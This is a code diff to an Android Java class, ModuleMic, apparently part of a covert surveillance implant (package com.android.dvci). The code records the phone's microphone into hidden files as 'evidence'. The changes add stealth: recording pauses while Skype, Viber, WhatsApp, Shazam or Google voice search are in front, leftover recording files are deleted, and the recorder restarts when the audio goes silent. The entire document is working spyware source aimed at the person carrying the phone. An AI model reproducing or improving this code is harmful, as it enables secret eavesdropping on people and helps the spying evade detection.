@@ -16,6 +16,7 @@ import android.media.AudioManager;
 import android.media.MediaRecorder;
 import android.media.MediaRecorder.OnErrorListener;
 import android.media.MediaRecorder.OnInfoListener;
+import android.os.PowerManager;
 import android.speech.RecognizerIntent;
 
 import com.android.dvci.Call;
@@ -29,6 +30,7 @@ import com.android.dvci.conf.ConfModule;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.file.AutoFile;
+import com.android.dvci.file.Path;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.listener.ListenerCall;
 import com.android.dvci.listener.ListenerProcess;
@@ -39,6 +41,8 @@ import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
 import com.android.mm.M;
 
+import java.io.File;
+import java.io.FilenameFilter;
 import java.io.IOException;
 import java.util.HashSet;
 import java.util.List;
@@ -59,9 +63,10 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	public static final byte[] AMR_HEADER = new byte[]{35, 33, 65, 77, 82, 10};
 	protected static final int SUSPEND_CALL = 0;
 	protected static StandByObserver standbyObserver;
-
+	protected boolean recorder_started=false;
 	protected int numFailures;
 	protected long fId;
+	protected static final String MIC_SUFFIX = M.e(".a"); //$NON-NLS-1$
 	int amr_sizes[] = {12, 13, 15, 17, 19, 20, 26, 31, 5, 6, 5, 5, 0, 0, 0, 0};
 
 	/**
@@ -72,12 +77,19 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	private Observer<ProcessInfo> processObserver;
 
 	public Set<String> blacklist = new HashSet<String>();
+	private PowerManager pm = null;
+	private int amp_zero_count = 0;
 
 	public ModuleMic() {
 		super();
 		resetBlacklist();
-	}
+		cleanLeftoverEvidence();
+		pm = (PowerManager) Status.getAppContext().getSystemService(Context.POWER_SERVICE);
 
+	}
+	public boolean isRecording() {
+		return recorder_started;
+	}
 	public synchronized void resetBlacklist() {
 		blacklist.clear();
 		addBlacklist(M.e("shazam"));
@@ -88,13 +100,12 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		addBlacklist(M.e("com.andrwq.recorder"));
 		addBlacklist(M.e("com.skype.raider"));
 		addBlacklist(M.e("com.viber.voip"));
-		if (android.os.Build.VERSION.SDK_INT > 20){
-			if(isSpeechRecognitionActivityPresented()){
-				addBlacklist(M.e("googlequicksearchbox:search"));
-			}else{
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(resetBlacklist)voice Recpgnition not present");//$NON-NLS-1$
-				}
+		addBlacklist(M.e("com.whatsapp"));
+		if (isSpeechRecognitionActivityPresented()) {
+			addBlacklist(Status.OK_GOOGLE_ACTIVITY);
+		} else {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(resetBlacklist)voice Recognition not present");//$NON-NLS-1$
 			}
 		}
 	}
@@ -146,6 +157,26 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		return true;
 	}
 
+	void cleanLeftoverEvidence() {
+		File fList = new File(Path.hidden() + M.e("/"));
+		File[] files = fList.listFiles(new FilenameFilter() {
+			public boolean accept(File dir, String filename) {
+				return filename.endsWith(MIC_SUFFIX);
+			}
+		});
+		for (File f : files) {
+			if (f.exists()) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (cleanLeftoverEvidence) deleting : " + f.getName());
+				}
+				if (!f.delete()) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (cleanLeftoverEvidence) failure deleting : " + f.getName());
+					}
+				}
+			}
+		}
+	}
 	/*
 	 * (non-Javadoc)
 	 * 
@@ -158,12 +189,16 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 			if (Cfg.DEBUG) {
 				Check.requires(status == StateRun.STARTING, "inconsistent status"); //$NON-NLS-1$
 			}
-
+			cleanLeftoverEvidence();
 			if (standbyObserver == null) {
 				standbyObserver = new StandByObserver(this);
 			}
 
-
+			addPhoneListener();
+			if (Cfg.DEBUG) {
+				Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
+			}
+			ListenerStandby.self().attach(standbyObserver);
 			if (canRecordMic()) {
 				startRecord();
 
@@ -191,11 +226,6 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	}
 
 	private void startRecord() throws IOException {
-		addPhoneListener();
-		if (Cfg.DEBUG) {
-			Check.asserts(standbyObserver != null, " (actualStart) Assert failed, null standbyObserver");
-		}
-		ListenerStandby.self().attach(standbyObserver);
 		// todo: sync
 		specificStart();
 	}
@@ -222,6 +252,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		ListenerStandby.self().detach(standbyObserver);
 		standbyObserver=null;
 		specificStop();
+		cleanLeftoverEvidence();
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (ended)");//$NON-NLS-1$
 		}
@@ -233,26 +264,15 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	 * (non-Javadoc)
 	 * 
 	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
+	 * actualGo runs only if not suspended
 	 */
 	@Override
 	public void actualGo() {
 		if (Cfg.DEBUG) {
 			Check.requires(status == StateRun.STARTED, "inconsistent status"); //$NON-NLS-1$
 		}
-		if (android.os.Build.VERSION.SDK_INT > 20){
-			if(isSpeechRecognitionActivityPresented()) {
-				if (!inInBlacklist(M.e("googlequicksearchbox:search"))) {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + "(resetBlacklist)voice Recognition present ADDING in blacklist");//$NON-NLS-1$
-					}
-					addBlacklist(M.e("googlequicksearchbox:search"));
-				}
-			}else if(inInBlacklist(M.e("googlequicksearchbox:search"))){
-				if (Cfg.DEBUG) {
-					Check.log(TAG + "(resetBlacklist)voice Recognition not present REMOVING from blacklist");//$NON-NLS-1$
-				}
-				delBlacklist(M.e("googlequicksearchbox:search"));
-			}
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (actualGo), recorder=" + recorder + "is recording=" + isRecording());
 		}
 		if (recorder == null) {
 			if (Cfg.DEBUG) {
@@ -269,10 +289,27 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 			}
 			return;
 		}
-		final int amp = recorder.getMaxAmplitude();
-		if (amp != 0) {
+
+		/* changed straight amp check to at least 2 time of zeroAmp
+		 * to avoid that just having one time amp=0 will restart the mic track
+		 */
+		if(recorder.getMaxAmplitude()==0){
+			amp_zero_count++;
+		}else{
+			amp_zero_count=0;
+		}
+		if (amp_zero_count <= 1 || !isRecording()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (actualGo): max amplitude=" + amp);//$NON-NLS-1$
+				Check.log(TAG + " (actualGo):amplitude not zero isRecording=" + isRecording());//$NON-NLS-1$
+			}
+		}else{
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualGo) start again recorder amplitude was null");//$NON-NLS-1$
+			}
+			specificStop();
+			amp_zero_count = 0;
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (stopAndStart): stop");
 			}
 		}
 
@@ -294,6 +331,9 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 
 	@Override
 	public void notifyStop(String b, boolean add) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (notifyStop): " + b + "add= "+add);
+		}
 		if(add){
 			suspend();
 		}else if(!haveStops()){
@@ -466,8 +506,12 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 
 	public int notification(Standby b) {
 		if (b.isScreenOff()) {
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (notification) standby, resume mic");
+				Check.log(TAG + " (notification) standby, resume mic, remove OK_GOOGLE stop if present");
+			}
+			if(inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
+				removeStop(Status.STOP_REASON_OK_GOOGLE);
 			}
 			if(canRecordMic()) {
 				resume();
@@ -482,20 +526,39 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	}
 
 	private boolean isForegroundBlacklist() {
+
 		String foreground = Status.self().getForeground();
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (isForegroundBlacklist) checking \""+foreground+"\'");
+		}
 		for (String bl : blacklist) {
 			if (foreground.contains(bl)) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (isForegroundBlacklist) found blacklist");
 				}
-				if(!stopList.contains(STOP_REASON_PROCESS)) {
-					addStop(STOP_REASON_PROCESS);
+				if (foreground.contains(Status.OK_GOOGLE_ACTIVITY)) {
+					if (pm != null && !pm.isScreenOn()) {
+						Check.log(TAG + " (isForegroundBlacklist) skip adding OK_GOOGLE when screen is off");
+						return false;
+					}
+					if (!inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
+						addStop(Status.STOP_REASON_OK_GOOGLE);
+					}
+
+				} else {
+					if (!inStoplist(STOP_REASON_PROCESS)) {
+						addStop(STOP_REASON_PROCESS);
+					}
 				}
 				return true;
 			}
 		}
-		if(stopList.contains(STOP_REASON_PROCESS)) {
+		if(inStoplist(STOP_REASON_PROCESS)) {
 			removeStop(STOP_REASON_PROCESS);
+		}
+		if (inStoplist(Status.STOP_REASON_OK_GOOGLE)) {
+			removeStop(Status.STOP_REASON_OK_GOOGLE);
 		}
 		return false;
 	}
@@ -533,34 +596,23 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	abstract void specificResume();
 	@Override
 	public synchronized void resume() {
-		if (isSuspended() && canRecordMic()) {
-			specificResume();
-			try {
-				specificStart();
-			} catch (final Exception e) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (resume) Error: " + e);//$NON-NLS-1$
-				}
-			}
-
+		/* just restart the thread, if mic can record the actualGo will restart it */
+		if (isSuspended()) {
 			super.resume();
-
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (resumed)");//$NON-NLS-1$
 			}
 		}else{
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (resume): cannot resume : canRecord "+ canRecordMic() + " isSuspended=" + isSuspended());
+				Check.log(TAG + " (resume): no need to resume : isSuspend=" + isSuspended());
 			}
 		}
 	}
 	@Override
 	public synchronized void suspend() {
+
 		if (!isSuspended()) {
+			amp_zero_count=0;
 			specificSuspend();
 			if (Status.self().semaphoreMediaserver.tryAcquire()) {
 				try {
